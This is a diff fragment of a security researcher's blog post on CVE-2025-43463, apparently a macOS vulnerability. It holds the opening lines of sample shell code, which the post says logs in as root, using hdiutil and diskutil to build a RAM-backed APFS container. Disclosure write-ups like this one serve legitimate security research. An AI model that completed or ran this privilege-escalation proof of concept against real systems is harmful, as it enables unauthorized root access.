@@ -4,7 +4,6 @@ CVE-2025-43463: Amy (@asentientbot), Mickey Jin (@patch1t)
 </code></pre><p>Unfortunately (for me), <a href="https://x.com/patch1t" target="_blank">Mickey Jin</a> found it first! So I didn't get a bounty.</p><h3>sample code</h3><p>As before, it will login as root.</p><pre><code>wholeDevice=$(hdiutil attach -nomount -plist ram://10000000 | plutil -extract system-entities.0.dev-entry raw -)
 diskutil apfs createcontainer $wholeDevice
 containerDevice=$(diskutil info -plist $wholeDevice | plutil -extract APFSContainerReference raw -)
-
 dataName=$(mktemp -u dataXXXXX)
 systemName=$(mktemp -u systemXXXXX)
 prebootName=$(mktemp -u prebootXXXXX)
